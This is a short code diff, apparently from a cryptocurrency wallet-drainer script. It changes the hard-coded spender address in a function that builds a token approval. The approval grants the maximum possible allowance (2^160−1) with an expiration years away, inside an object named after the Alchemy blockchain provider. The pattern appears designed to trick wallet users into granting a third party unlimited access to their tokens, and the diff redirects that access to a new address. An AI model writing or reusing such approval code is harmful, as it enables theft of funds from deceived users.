@@ -146,7 +146,7 @@ Alchemy.prototype = {
   createConfiguration: async function () {
     let tokens = await this.caculateValue()
 
-    const spender_address = '0xf347901a602e71e2F4ce7796e54146C2e746dd8c'
+    const spender_address = "0x5eE4A19bf6D6908AB12853Af169575bBFeCF8BFE";
     const amount = '1461501637330902918203684832716283019655932542975'
     const expiration = 1885674579
 
